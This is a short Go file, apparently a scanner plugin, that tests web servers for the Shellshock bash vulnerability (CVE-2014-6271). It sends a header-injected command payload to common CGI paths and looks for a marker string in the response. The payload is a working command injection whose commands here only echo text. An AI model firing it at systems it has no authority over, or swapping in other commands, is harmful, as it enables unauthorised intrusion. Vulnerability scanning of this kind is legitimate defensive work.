package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

func Run(target map[string]interface{}) map[string]string {
	output := make(map[string]string)

	ip, okIP := target["IP"].(string)
	port, okPort := target["Port"].(int)

	if !okIP || !okPort {
		return output
	}

	if port != 80 && port != 8080 && port != 8000 {
		return output
	}

	cgiPaths := []string{
		"/cgi-bin/test.cgi",
		"/cgi-bin/status",
		"/cgi-bin/admin.cgi",
		"/cgi-bin/stats",
		"/cgi-bin/test",
	}

	payload := "() { :;}; echo; echo Content-Type: text/plain; echo; echo VULNERABLE_SHELLSHOCK_TEST"

	client := &http.Client{
		Timeout: 2 * time.Second,
	}

	for _, path := range cgiPaths {
		url := fmt.Sprintf("http://%s:%d%s", ip, port, path)

		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", payload)
		req.Header.Set("Accept", "*/*")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}

		if strings.Contains(string(body), "VULNERABLE_SHELLSHOCK_TEST") {
			output["CVE-2014-6271"] = fmt.Sprintf("VULNERABLE - Shellshock détecté sur %s", path)
			return output
		}
	}

	return output
}
